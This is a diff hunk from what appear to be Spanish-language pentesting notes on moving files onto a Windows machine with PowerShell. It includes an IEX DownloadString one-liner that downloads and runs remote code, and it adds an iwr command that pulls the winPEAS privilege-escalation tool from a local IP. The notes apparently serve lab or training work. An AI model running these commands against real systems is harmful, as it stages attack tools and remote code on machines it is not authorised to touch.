@@ -18,6 +18,8 @@ copiar el código resultante en la computadora origen.
 
 IEX (New-Object Net.WebClient).DownloadString('url_to_file')
 
+iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
+
 ####file download via webrequest:
 
 Invoke-WebRequest url_del_file_sin_comillas -OutFile file_a_crear
